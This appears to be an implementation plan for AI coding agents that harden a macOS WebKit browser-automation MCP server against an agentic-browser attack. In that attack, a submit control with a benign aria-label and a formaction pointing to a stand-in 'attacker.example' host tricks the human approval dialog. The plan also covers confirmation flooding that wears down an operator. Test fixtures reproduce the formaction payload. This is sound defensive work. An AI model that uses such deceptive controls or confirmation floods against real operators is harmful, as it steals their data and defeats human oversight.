# SOTA delta after the Safari MCP server — Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Close the one attack that eight of this product's eight defences permit — an approval the operator grants on text the attacker authored — and correct every public claim the 2026-09-09 research passes refuted.

**Architecture:** The confirmation dialog currently shows what a control *calls itself*. It must also show what the control *would do*: the origin its data would reach, computed server-side from the freshly re-resolved element rather than from its accessible name. Two gates, at two moments — before dispatch from the DOM's own attributes (macOS 15+), and at submission time from WebKit's own `WKFormInfo` (macOS 27, feature-gated). Then a rate limit, because a gate a human clicks fifty times in a row is not a gate either.

**Tech Stack:** Swift 6, Swift Package Manager, Swift Testing, WebKit / AppKit, macOS 15+ on Apple silicon with macOS 27 features gated.

**Spec:** `docs/2026-08-29-full-sota-product-plan.md` is the parent product spec. This plan is driven by six research passes committed in `47e99cd`, chiefly `docs/research/2026-09-09-agentic-browser-security-sota.md` (the attack), `docs/research/2026-09-09-wkwebview-capability-ceiling.md` (the API that closes half of it, and four refuted claims) and `docs/research/2026-09-09-apple-safari-mcp-server.md` (what may be published about Apple's server).

## Why this plan replaced its first version

The first version of this plan ranked an HTTP-status field and a console journal first. The research inverted that. Written down so it is not re-litigated:

- **A defect was found and is already fixed** (`afab9af`): `browser_act` defaulted a modern client to MCP elicitation, a channel no client is obliged to show a human and at least one shipping client auto-accepts. The product's central sentence was false in a shipped release.
- **Four published claims were refuted** and must be corrected in documentation: native AppKit dispatch is not distinctive (`safaridriver` does the identical thing, and the WebDriver specification *requires* trusted events); per-action approval is not a first (Claude in Chrome ships it); refusing JavaScript is not unique (Browserbase exposes six tools with no `evaluate`); and "WebKit exposes no subresource-inspection API" is simply false — `WKWebsiteDataStore.proxyConfigurations` and `WKWebExtension` `webRequest` are both public.
- **The attack that matters** needs no injection sink, no cross-origin redirect and no authenticated origin. A submit control in an attacker-authored region carries `aria-label="Show tracking number"` and `formaction="https://attacker.example/…"`. The dialog fires, shows the accessible name, the human approves, and every telemetry field then reports success honestly. The dialog never showed the destination, because the dialog has no destination line.

## Global Constraints

- `swift-tools-version: 6.0`; floor `.macOS(.v15)`; every build and test command passes `--arch arm64`.
- macOS 27 API is reached only inside `if #available(macOS 27, *)`. The product must build and pass its suite against the macOS 15 floor.
- `xcrun swift-format lint --strict --recursive Sources Tests Package.swift` must exit 0 before any commit.
- Swift Testing (`import Testing`) in `WebKitUIMCPCoreTests`, `WebKitUIMCPRuntimeTests`, `WebKitUIMCPServerTests`, `WebKitUIMCPLicensingTests`. XCTest only in `WebKitUIMCPConfirmPolicyTests`.
- Run serially: `swift test --arch arm64 --no-parallel --skip hostExclusiveSession`.
- **Never call `performClick` in a test.** It runs a nested AppKit event loop; a `CFRunLoopStop` posted for it reaches the main run loop and Swift Testing's async entry calls `exit(0)`, so the bundle stops mid-run with no summary and status 0.
- Every Swift Testing bundle must print one `Test run with` line; `scripts/verify-native-installed.sh` enforces it.
- Licence is BUSL-1.1. Never MIT.
- Nothing is pushed. Publishing needs fresh explicit authorization.
- Commit trailers, exactly:
  ```
  Co-Authored-By: Claude Opus 5 (1M context) <noreply@anthropic.com>
  Claude-Session: https://claude.ai/code/session_019VwrQsCEcmT25v1DJUfJMw
  ```

---

## Already done

- [x] **Untrack the Playwright/CDP prior art** — `c046a9b`. Four tracked files offered `webkitui_cdp_send` or `webkitui_evaluate` while the README promised neither existed. Files kept on disk and ignored; `CapabilityClaimsCoherenceTests` fails if a tracked JavaScript file offers one again.
- [x] **Confirm a click on the server's own dialog** — `afab9af`. `browser_act` now defaults to `native`, matching `browser_navigate`.
- [x] **Correct the fraudulent-site privacy claim** — `6ce4807`. Apple names Google Safe Browsing *and Apple*, plus Tencent for mainland China and Hong Kong; Apple never describes the protocol as hashed, and Google may log the IP address.

---

## Task 1: Show the operator where the control would send data

The confirmation summary (`MCPServer.swift`, the builder ending `"Verification:\n\(verification)"`) shows the requested action, the current page, the target ID, the untrusted site label and the postcondition. It never shows the destination. A submit button's `formaction` overrides its form's `action`, so a control whose accessible name says one thing can post anywhere, and the operator has nothing to notice.

`formaction` is captured nowhere in the observation today: `grep -n formaction Sources` returns nothing. `href` is captured, but only as one of the stable attributes used for addressing, never surfaced in the dialog.

**Files:**
- Create: `Sources/WebKitUIMCPCore/SubmissionDestination.swift`
- Create: `Tests/WebKitUIMCPCoreTests/SubmissionDestinationTests.swift`
- Modify: `Sources/WebKitUIMCPRuntime/WebKitRuntime.swift` — observation capture, `WebKitObservedElement`
- Modify: `Sources/WebKitUIMCPServer/MCPServer.swift` — the act confirmation summary
- Test: `Tests/WebKitUIMCPServerTests/MCPServerTests.swift`

**Interfaces:**
- Produces:
  - `SubmissionDestination.line(pageURL: URL?, destination: String?) -> String?` — the dialog line, or `nil` when there is nothing to say
  - `WebKitObservedElement.submissionDestination: String?` — absolute URL string the control's data would reach, `nil` when the control sends nothing

- [ ] **Step 1: Write the failing unit test**

Create `Tests/WebKitUIMCPCoreTests/SubmissionDestinationTests.swift`:

```swift
import Foundation
import Testing

@testable import WebKitUIMCPCore

@Suite("Submission destination")
struct SubmissionDestinationTests {
  private let page = URL(string: "https://shop.example/orders/1471")!

  @Test("A same-origin destination is stated plainly")
  func sameOriginIsStated() {
    let line = SubmissionDestination.line(
      pageURL: page, destination: "https://shop.example/orders/1471/track")
    #expect(line == "Data would be sent to:\n\"https://shop.example\" (this page's origin)")
  }

  @Test("Another origin is called out as different, because that is the whole point")
  func foreignOriginIsCalledOut() {
    let line = SubmissionDestination.line(
      pageURL: page, destination: "https://attacker.example/collect?x=1")
    #expect(
      line == "Data would be sent to:\n\"https://attacker.example\" — A DIFFERENT SITE "
        + "from the page you are on, \"https://shop.example\"")
  }

  @Test("A control that sends nothing produces no line at all")
  func silentControlSaysNothing() {
    // A plain button is the common case. An extra line on every dialog is how an
    // operator learns to stop reading them.
    #expect(SubmissionDestination.line(pageURL: page, destination: nil) == nil)
  }

  @Test("A destination that cannot be resolved to an origin fails loud, not silent")
  func unresolvableDestinationIsReported() {
    // javascript: and data: URLs, and anything unparseable. Saying nothing here would
    // hide exactly the case worth showing.
    #expect(
      SubmissionDestination.line(pageURL: page, destination: "javascript:steal()")
        == "Data would be sent to:\nan address with no readable origin — treat as UNKNOWN")
    #expect(
      SubmissionDestination.line(pageURL: page, destination: "   ")
        == "Data would be sent to:\nan address with no readable origin — treat as UNKNOWN")
  }

  @Test("Only the origin is shown, never the query")
  func queryIsNeverShown() {
    let line = SubmissionDestination.line(
      pageURL: page, destination: "https://attacker.example/c?session=abc123&token=xyz")
    #expect(line?.contains("abc123") == false)
    #expect(line?.contains("token") == false)
  }
}
```

- [ ] **Step 2: Run it to verify it fails**

```bash
swift test --arch arm64 --no-parallel --filter SubmissionDestinationTests
```

Expected: FAIL to compile, `cannot find 'SubmissionDestination' in scope`.

- [ ] **Step 3: Write the minimal implementation**

Create `Sources/WebKitUIMCPCore/SubmissionDestination.swift`:

```swift
import Foundation

/// Where a control's data would go, as a line for the human confirmation.
///
/// The dialog showed what a control calls itself and never where it would send anything.
/// A submit button's `formaction` overrides its form's `action`, so a control whose
/// accessible name reads "Show tracking number" can post to another site, and an
/// operator reading the dialog had nothing to notice. Published as the attack this
/// product did not stop: `docs/research/2026-09-09-agentic-browser-security-sota.md`.
public enum SubmissionDestination {
  public static func line(pageURL: URL?, destination: String?) -> String? {
    guard let destination, !destination.trimmingCharacters(in: .whitespacesAndNewlines).isEmpty
    else { return nil }
    let unknown = "Data would be sent to:\nan address with no readable origin — treat as UNKNOWN"
    guard let target = URL(string: destination), let targetOrigin = origin(of: target) else {
      return unknown
    }
    // Only the origin. A query string in an approval dialog is both unreadable and a
    // place to hide an exfiltrated secret.
    guard let pageOrigin = pageURL.flatMap(origin(of:)) else {
      return "Data would be sent to:\n\(quoted(targetOrigin))"
    }
    if targetOrigin == pageOrigin {
      return "Data would be sent to:\n\(quoted(targetOrigin)) (this page's origin)"
    }
    return "Data would be sent to:\n\(quoted(targetOrigin)) — A DIFFERENT SITE "
      + "from the page you are on, \(quoted(pageOrigin))"
  }

  private static func origin(of url: URL) -> String? {
    guard let scheme = url.scheme?.lowercased(), ["http", "https"].contains(scheme),
      let host = url.host, !host.isEmpty
    else { return nil }
    if let port = url.port { return "\(scheme)://\(host):\(port)" }
    return "\(scheme)://\(host)"
  }

  private static func quoted(_ value: String) -> String {
    String(decoding: (try? JSONEncoder().encode(value)) ?? Data(), as: UTF8.self)
  }
}
```

- [ ] **Step 4: Run it to verify it passes**

```bash
swift test --arch arm64 --no-parallel --filter SubmissionDestinationTests
```

Expected: PASS, 5 tests.

- [ ] **Step 5: Capture the destination in the observation script**

Find the element description in the injected observation source:

```bash
grep -n 'accessibleName: bounded(nameOf(element))' Sources/WebKitUIMCPRuntime/WebKitRuntime.swift
```

Add a sibling field in that same object literal. `formaction` wins over the form's `action`, an anchor uses `href`, and everything else sends nothing:

```javascript
        submissionDestination: (() => {
          // formAction reflects formaction when present and falls back to the owning
          // form's action, which is exactly the precedence HTML gives them.
          if (element.form && typeof element.formAction === 'string' && element.formAction) {
            return element.formAction;
          }
          if (element.tagName === 'FORM' && typeof element.action === 'string') {
            return element.action;
          }
          if (element.tagName === 'A' && element.hasAttribute('href')) {
            return element.href;
          }
          return null;
        })(),
```

- [ ] **Step 6: Carry it on the observed element**

In `public struct WebKitObservedElement`, beside the other optional facts:

```swift
  /// Absolute URL this control's data would reach, from the DOM's own attributes.
  /// `nil` for a control that sends nothing. Site-authored, so it is shown to the
  /// human and never trusted as policy.
  public var submissionDestination: String?
```

Build and follow the compiler to the construction site, which is the `describe`/element-mapping function that already sets `accessibleName`.

- [ ] **Step 7: Write the failing server test**

In `Tests/WebKitUIMCPServerTests/MCPServerTests.swift`, before `  @Test("Native approval and AppKit dispatch produce distinct trusted receipts")`:

```swift
  @Test("A control whose formaction leaves the page says so in the confirmation")
  func foreignSubmissionDestinationIsConfirmed() async throws {
    // The published attack: attacker-authored region, a submit control whose accessible
    // name reads like the task the operator asked for and whose formaction points
    // elsewhere. Every other field in the receipt reports success honestly, so the
    // dialog is the only place this can be caught.
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    runtime.webView.loadHTMLString(
      """
      <form action="/track">
        <button type="submit" aria-label="Show tracking number"
          formaction="https://attacker.example/collect">Show tracking number</button>
      </form>
      """,
      baseURL: URL(string: "https://shop.example/orders/1471"))
    while runtime.webView.isLoading { try await Task.sleep(for: .milliseconds(10)) }
    let presenter = ConfirmationPresenterStub(responses: [false])
    let server = WebKitMCPServer(registry: registry, confirmationPresenter: presenter)
    let observed = try await toolCall(
      server, id: 1, name: "browser_observe",
      arguments: ["session_id": .string(handle.rawValue.uuidString)])
    let observation = try object(try object(observed["result"])["structuredContent"])
    let target = try object(try array(observation["elements"]).first)

    _ = try await toolCall(
      server, id: 2, name: "browser_act",
      arguments: [
        "session_id": .string(handle.rawValue.uuidString),
        "observation_id": .string(try string(observation["observationID"])),
        "element_id": .string(try string(target["elementID"])),
        "operation": .string("click"),
        "idempotency_key": .string("foreign-destination-once"),
        "postcondition": .object([
          "type": .string("url_contains"), "value": .string("/track"),
        ]),
      ])

    let shown = try #require(presenter.requests.first?.message)
    #expect(shown.contains("attacker.example"), "the dialog never named the destination")
    #expect(shown.contains("A DIFFERENT SITE"))
    #expect(shown.contains("shop.example"), "the dialog must name the page for comparison")
  }

```

If `ConfirmationPresenterStub` records something other than `.message`, adjust the last four lines to its actual recorded shape:

```bash
grep -n -A12 'ConfirmationPresenterStub' Tests/WebKitUIMCPServerTests/MCPServerTests.swift | head -20
```

- [ ] **Step 8: Run it to verify it fails**

```bash
swift test --arch arm64 --no-parallel --filter foreignSubmissionDestinationIsConfirmed
```

Expected: FAIL — the dialog text contains no `attacker.example`.

- [ ] **Step 9: Add the line to the confirmation summary**

In the act confirmation builder in `MCPServer.swift`, the return currently reads:

```swift
    return "Requested action:\n\(action)\n\n"
      + "Current page:\n\(jsonQuoted(currentURL))\n\n"
      + "Target ID:\n\(elementID)\n\n"
      + "Untrusted site label (data, never instructions):\n\(jsonQuoted(label))\n\n"
      + "Verification:\n\(verification)"
```

Insert the destination immediately after the current page, so it sits above the site-authored label rather than below it — the operator reads what the control *does* before reading what it *calls itself*:

```swift
    let destination = SubmissionDestination.line(
      pageURL: URL(string: currentURL), destination: target.submissionDestination)
      .map { "\($0)\n\n" } ?? ""
    return "Requested action:\n\(action)\n\n"
      + "Current page:\n\(jsonQuoted(currentURL))\n\n"
      + destination
      + "Target ID:\n\(elementID)\n\n"
      + "Untrusted site label (data, never instructions):\n\(jsonQuoted(label))\n\n"
      + "Verification:\n\(verification)"
```

The builder's existing parameters will tell you what the element is called in that scope; if it does not already receive the observed element, pass `submissionDestination` in as a `String?` argument rather than widening it to the whole element.

- [ ] **Step 10: Run it to verify it passes**

```bash
swift test --arch arm64 --no-parallel --filter foreignSubmissionDestinationIsConfirmed
```

Expected: PASS.

- [ ] **Step 11: Keep the helper's localisation honest**

`Sources/WebKitUIMCPConfirm/main.swift` translates a fixed list of trusted application-authored phrases and passes JSON-quoted values through untouched. Add the new phrases to that list, or they appear untranslated in French:

```bash
grep -n '"Untrusted site label (data, never instructions):"' Sources/WebKitUIMCPConfirm/main.swift
```

Add `"Data would be sent to:"`, `"(this page's origin)"`, `"— A DIFFERENT SITE from the page you are on,"` and `"an address with no readable origin — treat as UNKNOWN"` to the `keys` array, and the matching entries to both `.lproj` catalogues. Then:

```bash
"$(swift build -c release --arch arm64 --show-bin-path)/webkitui-mcp-confirm" --verify-localization fr
"$(swift build -c release --arch arm64 --show-bin-path)/webkitui-mcp-confirm" --verify-localization en
```

Expected: both print JSON and exit 0. `scripts/verify-package-preview.sh` runs the same check.

- [ ] **Step 12: Full suite, lint, commit**

```bash
xcrun swift-format lint --strict --recursive Sources Tests Package.swift
swift test --arch arm64 --no-parallel --skip hostExclusiveSession
```

Expected: four `Test run with` summaries, no failures.

```bash
git add Sources/WebKitUIMCPCore/SubmissionDestination.swift \
  Tests/WebKitUIMCPCoreTests/SubmissionDestinationTests.swift \
  Sources/WebKitUIMCPRuntime/WebKitRuntime.swift \
  Sources/WebKitUIMCPServer/MCPServer.swift \
  Sources/WebKitUIMCPConfirm/main.swift \
  Tests/WebKitUIMCPServerTests/MCPServerTests.swift
git commit -F - <<'EOF'
feat: tell the operator where a control would send their data

The confirmation showed what a control calls itself and never where it would send
anything, which is the whole of the attack this product did not stop: an
attacker-authored region, a submit control whose accessible name reads like the
task the operator asked for, and a formaction pointing at another site. Every
other field in the receipt then reports success honestly — native confirmation,
real activation, trusted event measured, postcondition satisfied — because none of
them is wrong.

The dialog now names the destination origin above the site-authored label, calls
out plainly when it is a different site from the page, shows the origin only and
never the query, and reports an unresolvable address as UNKNOWN rather than
staying silent. A control that sends nothing adds no line, because a dialog that
grows on every action is how an operator learns to stop reading it.

Evidence: docs/research/2026-09-09-agentic-browser-security-sota.md.

Co-Authored-By: Claude Opus 5 (1M context) <noreply@anthropic.com>
Claude-Session: https://claude.ai/code/session_019VwrQsCEcmT25v1DJUfJMw
EOF
```

---

## Task 2: Refuse a submission that goes somewhere the operator did not approve

Task 1 shows the destination the DOM claims. This one checks what WebKit says actually happened, which is the stronger evidence and the one a page cannot author.

macOS 27 adds, verified in `MacOSX27.0.sdk`:

```objc
@interface WKFormInfo : NSObject          // API_AVAILABLE(macos(27.0))
@property (readonly) WKFrameInfo *targetFrame;
@property (readonly) WKFrameInfo *sourceFrame;
@property (readonly) NSURL *submissionURL;
@property (readonly) NSString *httpMethod;
@property (readonly) NSDictionary<NSString *, NSString *> *formValues;
@end

- (void)webView:(WKWebView *)webView willSubmitForm:(WKFormInfo *)formInfo
    submissionHandler:(void (^)(void))submissionHandler;   // WK_SWIFT_ASYNC(3)
```

Two facts decide the design, and both must be respected:

1. **`submissionHandler` is a delay, not a veto.** It takes no decision; the header says it indicates "that the form submission can continue". The refusal therefore happens where refusals already happen — `decidePolicyFor navigationAction`, returning `.cancel`.
2. **It fires only for real form submissions.** A single-page application that intercepts `submit` and posts with `fetch` never reaches it. This closes classic form posts and must not be described as closing more.

**Files:**
- Create: `Sources/WebKitUIMCPCore/SubmissionApproval.swift`
- Create: `Tests/WebKitUIMCPCoreTests/SubmissionApprovalTests.swift`
- Modify: `Sources/WebKitUIMCPRuntime/WebKitRuntime.swift`
- Test: `Tests/WebKitUIMCPRuntimeTests/WebKitRuntimeTests.swift`

**Interfaces:**
- Consumes: nothing from Task 1; the two are independent gates and may be implemented in either order.
- Produces:
  - `SubmissionApproval.decide(approvedOrigin: String?, submissionURL: URL, httpMethod: String) -> SubmissionApproval.Decision`, where `Decision` is `.allow`, `.refuseForeignOrigin(String)` or `.refuseUnapproved`
  - `WebKitRuntime.latestSubmissionFacts() -> WebKitSubmissionFacts?` carrying origin, method and the **count and key names** of `formValues` — never the values

- [ ] **Step 1: Write the failing unit test**

Create `Tests/WebKitUIMCPCoreTests/SubmissionApprovalTests.swift`:

```swift
import Foundation
import Testing

@testable import WebKitUIMCPCore

@Suite("Submission approval")
struct SubmissionApprovalTests {
  private func url(_ value: String) throws -> URL { try #require(URL(string: value)) }

  @Test("A submission to the approved origin continues")
  func sameOriginAllowed() throws {
    #expect(
      SubmissionApproval.decide(
        approvedOrigin: "https://shop.example",
        submissionURL: try url("https://shop.example/orders/track"),
        httpMethod: "POST") == .allow)
  }

  @Test("A submission to another origin is refused by name")
  func foreignOriginRefused() throws {
    #expect(
      SubmissionApproval.decide(
        approvedOrigin: "https://shop.example",
        submissionURL: try url("https://attacker.example/collect"),
        httpMethod: "POST") == .refuseForeignOrigin("https://attacker.example"))
  }

  @Test("A submission with nothing approved is refused, not allowed")
  func unapprovedRefused() throws {
    // Fail closed. A form that submits with no approval on record is the case an
    // attacker constructs, not the case a user asks for.
    #expect(
      SubmissionApproval.decide(
        approvedOrigin: nil,
        submissionURL: try url("https://shop.example/orders/track"),
        httpMethod: "POST") == .refuseUnapproved)
  }

  @Test("An unreadable submission origin is refused")
  func unreadableOriginRefused() throws {
    #expect(
      SubmissionApproval.decide(
        approvedOrigin: "https://shop.example",
        submissionURL: try url("data:text/plain,x"),
        httpMethod: "POST") == .refuseForeignOrigin("unreadable"))
  }

  @Test("A port difference is a different origin")
  func portIsPartOfOrigin() throws {
    #expect(
      SubmissionApproval.decide(
        approvedOrigin: "https://shop.example",
        submissionURL: try url("https://shop.example:8443/collect"),
        httpMethod: "POST") == .refuseForeignOrigin("https://shop.example:8443"))
  }
}
```

- [ ] **Step 2: Run it to verify it fails**

```bash
swift test --arch arm64 --no-parallel --filter SubmissionApprovalTests
```

Expected: FAIL to compile, `cannot find 'SubmissionApproval' in scope`.

- [ ] **Step 3: Write the minimal implementation**

Create `Sources/WebKitUIMCPCore/SubmissionApproval.swift`:

```swift
import Foundation

/// Whether a form submission may proceed, judged against the origin the human approved.
///
/// `WKFormInfo` reports what WebKit is about to send, which is the one description of a
/// submission the page cannot author. Its `submissionHandler` is a delay and not a veto,
/// so this decision is applied where refusals already live: the navigation policy
/// handler, returning `.cancel`.
public enum SubmissionApproval {
  public enum Decision: Equatable, Sendable {
    case allow
    /// The submission leaves the approved origin. Carries the origin it would reach, or
    /// `"unreadable"` when there is no origin to name.
    case refuseForeignOrigin(String)
    /// Nothing was approved. Fail closed.
    case refuseUnapproved
  }

  public static func decide(
    approvedOrigin: String?,
    submissionURL: URL,
    httpMethod: String
  ) -> Decision {
    guard let approvedOrigin, !approvedOrigin.isEmpty else { return .refuseUnapproved }
    guard let submissionOrigin = origin(of: submissionURL) else {
      return .refuseForeignOrigin("unreadable")
    }
    guard submissionOrigin == approvedOrigin else {
      return .refuseForeignOrigin(submissionOrigin)
    }
    return .allow
  }

  private static func origin(of url: URL) -> String? {
    guard let scheme = url.scheme?.lowercased(), ["http", "https"].contains(scheme),
      let host = url.host, !host.isEmpty
    else { return nil }
    if let port = url.port { return "\(scheme)://\(host):\(port)" }
    return "\(scheme)://\(host)"
  }
}
```

- [ ] **Step 4: Run it to verify it passes**

```bash
swift test --arch arm64 --no-parallel --filter SubmissionApprovalTests
```

Expected: PASS, 5 tests.

- [ ] **Step 5: Record the submission facts, values excluded**

In `Sources/WebKitUIMCPRuntime/WebKitRuntime.swift`, add the receipt type beside the other public result types:

```swift
/// What WebKit reported it was about to submit. Values are deliberately absent: a form
/// carries passwords, card numbers and one-time codes, and this receipt is exported.
public struct WebKitSubmissionFacts: Codable, Equatable, Sendable {
  public let origin: String?
  public let httpMethod: String
  public let fieldCount: Int
  /// Field names only, bounded. A name is a schema; a value is a secret.
  public let fieldNames: [String]
}
```

Add the storage beside the other per-navigation state:

```swift
  private var latestSubmissionFacts: WebKitSubmissionFacts?
```

and the accessor beside `latestNavigationAuditEvent()`:

```swift
  public func latestSubmissionFacts() -> WebKitSubmissionFacts? { latestSubmissionFacts }
```

Add the delegate method, gated:

```swift
  @available(macOS 27, *)
  public func webView(_ webView: WKWebView, willSubmitForm formInfo: WKFormInfo) async {
    latestSubmissionFacts = WebKitSubmissionFacts(
      origin: Self.sanitizedOrigin(for: formInfo.submissionURL),
      httpMethod: formInfo.httpMethod,
      fieldCount: formInfo.formValues.count,
      fieldNames: formInfo.formValues.keys.sorted().prefix(50).map(String.init))
    pendingSubmissionDecision = SubmissionApproval.decide(
      approvedOrigin: approvedSubmissionOrigin,
      submissionURL: formInfo.submissionURL,
      httpMethod: formInfo.httpMethod)
  }
```

`Self.sanitizedOrigin(for:)` already exists — it is used by `recordNavigationAudit`. Add the two new stored properties it references:

```swift
  /// The origin the human approved for the action in flight, set where the confirmed
  /// action is dispatched and cleared when the action completes.
  private var approvedSubmissionOrigin: String?
  private var pendingSubmissionDecision: SubmissionApproval.Decision?
```

- [ ] **Step 6: Apply the refusal where refusals live**

In `webView(_:decidePolicyFor navigationAction:)`, before the existing decision returns:

```swift
    if let decision = pendingSubmissionDecision {
      pendingSubmissionDecision = nil
      if case .refuseForeignOrigin = decision {
        navigationFailure = WebKitRuntimeError.networkBoundaryDenied
        return .cancel
      }
      if case .refuseUnapproved = decision {
        navigationFailure = WebKitRuntimeError.networkBoundaryDenied
        return .cancel
      }
    }
```

Read the surrounding method first — it already has a policy-decision structure, and this must slot into it rather than shadow an earlier return:

```bash
grep -n 'decidePolicyFor navigationAction' Sources/WebKitUIMCPRuntime/WebKitRuntime.swift
```

- [ ] **Step 7: Write the failing runtime test, gated**

In `Tests/WebKitUIMCPRuntimeTests/WebKitRuntimeTests.swift`:

```swift
  @available(macOS 27, *)
  @Test("A form that submits to another origin is refused, and its field names are kept")
  func foreignFormSubmissionIsRefused() async throws {
    // WebKit's own account of what is being sent, which the page cannot author. Only
    // classic form submissions reach this hook: a single-page application that
    // intercepts submit and posts with fetch does not, and this must never be described
    // as covering that.
    let runtime = WebKitRuntime()
    _ = try await runtime.loadHTML(
      """
      <form action="https://attacker.example/collect" method="post">
        <input name="tracking" value="1471">
        <input name="email" value="someone@example.test">
        <button type="submit">Show tracking number</button>
      </form>
      """,
      baseURL: URL(string: "https://shop.example/orders/1471"),
      timeout: fixtureNavigationTimeout, quietWindow: .milliseconds(40))

    _ = try await runtime.webView.evaluateJavaScript(
      "document.querySelector('form').submit(); undefined;")
    for _ in 0..<fixtureSettlementPolls where runtime.latestSubmissionFacts() == nil {
      try await Task.sleep(for: .milliseconds(20))
    }

    let facts = try #require(runtime.latestSubmissionFacts())
    #expect(facts.origin == "https://attacker.example")
    #expect(facts.httpMethod.uppercased() == "POST")
    #expect(facts.fieldCount == 2)
    #expect(facts.fieldNames == ["email", "tracking"])
    // The receipt is exported. A value in it is a leaked secret.
    let encoded = String(
      decoding: try JSONEncoder().encode(facts), as: UTF8.self)
    #expect(!encoded.contains("someone@example.test"))
    #expect(!encoded.contains("1471"))
  }

```

- [ ] **Step 8: Run it, then implement until it passes**

```bash
swift test --arch arm64 --no-parallel --filter foreignFormSubmissionIsRefused
```

Expected first: FAIL, `latestSubmissionFacts` missing. Then PASS after steps 5 and 6.

If this Mac is not on macOS 27, Swift Testing skips the test and the bundle summary shows one fewer test. Record which happened in the commit message; a skipped test is not a passing test.

- [ ] **Step 9: Full suite, lint, commit**

```bash
xcrun swift-format lint --strict --recursive Sources Tests Package.swift
swift test --arch arm64 --no-parallel --skip hostExclusiveSession
sw_vers -productVersion
```

```bash
git add Sources/WebKitUIMCPCore/SubmissionApproval.swift \
  Tests/WebKitUIMCPCoreTests/SubmissionApprovalTests.swift \
  Sources/WebKitUIMCPRuntime/WebKitRuntime.swift \
  Tests/WebKitUIMCPRuntimeTests/WebKitRuntimeTests.swift
git commit -F - <<'EOF'
feat: refuse a form submission that leaves the origin the human approved

Task 1 shows the destination the DOM claims. This is WebKit's own account of what
is actually being sent, through WKFormInfo on macOS 27, which is the one
description of a submission a page cannot author.

submissionHandler is a delay and not a veto — the header says it only indicates
the submission may continue — so the refusal is applied in the navigation policy
handler, which is where every other refusal in this runtime already lives. A
submission with no approval on record is refused too, because a form submitting
with nothing approved is a case an attacker constructs.

The receipt carries origin, method, field count and field names. Values are
excluded by construction: a form carries passwords, card numbers and one-time
codes, and this receipt is exported. A test asserts the encoded receipt contains
neither fixture value.

Only classic form submissions reach this hook. A single-page application that
intercepts submit and posts with fetch does not, and nothing here claims
otherwise. Feature-gated to macOS 27 against the macOS 15 floor.

Evidence: docs/research/2026-09-09-wkwebview-capability-ceiling.md.

Co-Authored-By: Claude Opus 5 (1M context) <noreply@anthropic.com>
Claude-Session: https://claude.ai/code/session_019VwrQsCEcmT25v1DJUfJMw
EOF
```

---

## Task 2 outcome, recorded because it changes what may be claimed

Committed as `e86f737`, correct, and **inert on this build**. WebKit does not call
`webView(_:willSubmitForm:submissionHandler:)` on macOS 27.0 build 26A5419a — not for
`submit()`, not for `requestSubmit()`, and not for a native trusted-gesture click. All 601
`WKPreferences._features()` entries were enumerated and none enables it. This reproduces
`docs/research/2026-08-22-will-submit-form-notebooklm.md`, which measured zero events on
build 26A5416b three weeks earlier — evidence this plan should have read before ranking
the task first.

Consequences that Task 4 must carry into the documentation:

- `SubmissionApproval` and its wiring are implemented and unit-tested, and will activate
  if WebKit begins delivering the callback. Nothing about them is claimed to run today.
- **Task 1's destination line is the live defence** against the published attack. The
  `WKFormInfo` gate must never be described as a second live gate.
- `willSubmitForm` already existed in the runtime from the first commit, as an HMAC-only
  audit hook. Task 2 extended it rather than adding a duplicate selector.
- The runtime test drives the delegate through subclassed WebKit stubs, because the OS
  declares the method and never calls it. `-[WKFrameInfo dealloc]` traps on a null
  `CFRetain` when a Swift subclass is released, so the stubs are singletons kept for the
  life of the process. That is bounded and documented at their definition, and it is not
  a substitute for the real path.

---

## Task 3: Make dialog fatigue cost the attacker something

`grep -niE 'rateLimit|cooldown|throttl'` over `Sources/WebKitUIMCPServer` returns nothing. On a product whose safety rests on a human reading a dialog, an agent — or an injected page driving one — can raise fifty confirmations in a row and train the operator to click through. OWASP files this as the clickthrough vulnerability, and it is gap 4 in the security research.

The fix is not to refuse; it is to make a burst visible and to slow it. A pure policy type decides, so it is testable without AppKit.

**Files:**
- Create: `Sources/WebKitUIMCPCore/ConfirmationRatePolicy.swift`
- Create: `Tests/WebKitUIMCPCoreTests/ConfirmationRatePolicyTests.swift`
- Modify: `Sources/WebKitUIMCPServer/MCPServer.swift`
- Test: `Tests/WebKitUIMCPServerTests/MCPServerTests.swift`

**Interfaces:**
- Produces: `ConfirmationRatePolicy` with `mutating func record(atMonotonicNanoseconds:) -> ConfirmationRatePolicy.Verdict`, `Verdict` being `.normal`, `.burst(recentCount: Int)` or `.refuse(recentCount: Int)`; `burstThreshold` = 5, `refuseThreshold` = 20, `window` = 60 seconds.

- [ ] **Step 1: Write the failing unit test**

Create `Tests/WebKitUIMCPCoreTests/ConfirmationRatePolicyTests.swift`:

```swift
import Foundation
import Testing

@testable import WebKitUIMCPCore

@Suite("Confirmation rate policy")
struct ConfirmationRatePolicyTests {
  private let second: UInt64 = 1_000_000_000

  @Test("Ordinary work is never slowed")
  func ordinaryWorkIsNormal() {
    var policy = ConfirmationRatePolicy()
    for index in 0..<4 {
      #expect(policy.record(atMonotonicNanoseconds: UInt64(index) * 5 * second) == .normal)
    }
  }

  @Test("A burst is named, with how many confirmations it counted")
  func burstIsNamed() {
    var policy = ConfirmationRatePolicy()
    var verdict = ConfirmationRatePolicy.Verdict.normal
    for index in 0..<ConfirmationRatePolicy.burstThreshold {
      verdict = policy.record(atMonotonicNanoseconds: UInt64(index) * second / 2)
    }
    #expect(verdict == .burst(recentCount: ConfirmationRatePolicy.burstThreshold))
  }

  @Test("A flood is refused rather than shown")
  func floodIsRefused() {
    var policy = ConfirmationRatePolicy()
    var verdict = ConfirmationRatePolicy.Verdict.normal
    for index in 0..<ConfirmationRatePolicy.refuseThreshold {
      verdict = policy.record(atMonotonicNanoseconds: UInt64(index) * second / 10)
    }
    #expect(verdict == .refuse(recentCount: ConfirmationRatePolicy.refuseThreshold))
  }

  @Test("The window forgets, so a long session is not punished for its past")
  func windowForgets() {
    var policy = ConfirmationRatePolicy()
    for index in 0..<ConfirmationRatePolicy.refuseThreshold {
      _ = policy.record(atMonotonicNanoseconds: UInt64(index) * second / 10)
    }
    // Well past the window.
    #expect(policy.record(atMonotonicNanoseconds: 600 * second) == .normal)
  }
}
```

- [ ] **Step 2: Run it to verify it fails**

```bash
swift test --arch arm64 --no-parallel --filter ConfirmationRatePolicyTests
```

Expected: FAIL to compile.

- [ ] **Step 3: Write the minimal implementation**

